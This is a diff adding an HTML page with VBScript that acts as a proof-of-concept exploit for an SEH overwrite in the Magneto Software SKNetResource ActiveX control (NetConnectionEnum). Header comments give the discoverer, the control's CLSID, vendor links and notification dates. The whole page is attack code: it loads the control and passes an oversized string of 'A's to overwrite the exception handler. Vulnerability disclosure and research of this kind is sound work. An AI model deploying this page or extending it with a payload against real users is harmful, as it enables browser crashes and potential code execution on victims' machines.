@@ -1,0 +1,25 @@
+<html>
+<object classid='clsid:61251370-92BF-4A0E-8236-5904AC6FC9F2' id='target' /></object>
+<script language='vbscript'>
+'Magneto Software Net Resource ActiveX NetConnectionEnum SEH Overwrite POC
+'Discovered by:  s4squatch
+'Site:  www.securestate.com
+'Date Discovered: 02/11/10
+'www:  http://www.magnetosoft.com/products/sknetresource/sknetresource_features.htm
+'Download:  http://www.magnetosoft.com/downloads/SystemInfoPackSetup.exe
+'Vendor Notified: 02/02/10 --> NO RESPONSE
+'Vendor Notified: 02/11/10 --> NO RESPONSE
+'Vendor Notified: 02/17/10 --> NO RESPONSE
+'SKNetResource.ocx
+'Function NetConnectionEnum ( ByVal strServerName As String ,  ByVal strQualifier As String ,  ByRef pvarNetConnectionInfo As Variant ) As Long
+'progid = "SKNETRESOURCELib.SKNetResource"
+
+'SEH overwrite
+buff = String(12334, "A")
+
+arg1 = buff
+arg2 = "defaultV"
+arg3 = "defaultV"
+target.NetConnectionEnum arg1 ,arg2 ,arg3 
+
+</script>
